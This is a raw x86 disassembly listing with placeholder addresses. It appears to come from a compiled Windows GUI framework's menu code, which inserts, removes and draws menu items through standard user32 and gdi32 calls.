mov eax [ esi ]
call sub_40442c
pop edx
pop ecx
call sub_407bf4
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_40422c
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4044cc
sub_446a88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_446a2c
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_446a2c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_446a2c
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_446a2c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446b6a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_446828
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407ba4
test eax eax
jne r-xdata
sub_446ba0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_449140
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_449150
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_446c00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_449140
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_449140
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_449150
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_449150
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_446ba0
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_446ba0
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_449150
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_449150
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_446d4c
push ebx
mov ebx eax
mov eax ebx
call sub_4438f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_44bc5c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_446d84
push ebx
mov ebx eax
mov eax ebx
call sub_443908
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446db4
push ebx
mov ebx eax
mov eax ebx
call sub_44391c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446de4
push ebx
mov ebx eax
mov eax ebx
call sub_443944
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446e14
push ebx
mov ebx eax
mov eax ebx
call sub_44396c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404378
je r-xdata
mov al 0x1
pop ebx
retn
sub_446e48
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_443930
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_446e84
push ebx
mov ebx eax
mov eax ebx
call sub_443980
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446eb8
push ebx
mov ebx eax
mov eax ebx
call sub_443994
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446eec
push ebx
mov ebx eax
mov eax ebx
call sub_4439a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446f20
push ebx
mov ebx eax
mov eax ebx
call sub_419ae4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446f48
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_446f68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_448fa8
sub_446f88
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_449018
sub_446fa8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44906c
sub_446fc8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_446fe4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403fc0
sub_447008
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_449198
sub_447028
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_449174
sub_447048
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_449188
sub_447068
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_447094
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4191e0
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_446b80
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_449aa4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_447110
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44ba40
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_449140
test eax eax
jg r-xdata
mov edx esi
call sub_4494d8
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_449150
call sub_403234
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403234
lea eax [ esi + 0x44 ]
call sub_40cbf8
lea eax [ esi + 0x78 ]
call sub_40cbf8
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_44752c
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_413d14
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41922c
test bl bl
jle r-xdata
call sub_403234
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4471c4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447426
lea eax [ ebp - 0x40 ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_404004
mov eax ebx
call sub_449140
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_4476d4
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404378
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_449140
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_4496fc
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_446828
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042ec
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40442c
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_40442c
push eax
mov eax ebx
call sub_4476d4
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_448d18
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404378
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_40442c
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_449140
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_4476d4
mov [ ebp - 0x25 ] eax
sub_44743f
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_4471c4
xor eax eax
pop ebp
retn
sub_447464
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44ad38
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_449d00
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44a1fc
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_446c00
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_4474d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_418310
mov eax [ ebp - 0x4 ]
call sub_446a88
mov edx eax
mov eax ebx
call sub_449174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447525
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_44752c
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_4475a4
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_4192b0
sub_447568
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419630
mov eax ebx
call sub_449128
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_449128
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403430
pop esi
pop ebx
retn
mov eax ebx
call sub_4475a4
sub_4475a4
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_4476d4
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_4475a4
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_4476d4
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_4476d4
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_447464
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebp
call sub_4476d4
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_447674
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_449140
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_449150
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_449150
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_449150
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44677c
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_4476d4
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_447464
mov eax [ rw-data ]
call sub_44677c
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_447720
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419558
push ebx
push sub_4474d4
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_447764
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4496fc
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404004
test bh 0x4
je r-xdata
mov eax edi
call sub_44ad38
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404378
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41cb20
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404234
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41c4f8
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41c504
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44794f
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d1bc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40422c
push eax
mov eax [ ebp - 0xc ]
call sub_40442c
push eax
mov eax [ ebp - 0x4 ]
call sub_41d1bc
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c238
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40422c
push eax
mov eax [ ebp - 0xc ]
call sub_40442c
push eax
mov eax [ ebp - 0x4 ]
call sub_41d1bc
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c238
mov eax 0xff00000d
call sub_41bd78
mov esi eax
mov eax 0xff000010
call sub_41bd78
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c238
jmp r-xdata
sub_4479b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cda8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41ca04
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c238
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404378
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41ca04
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cda8
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444778
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
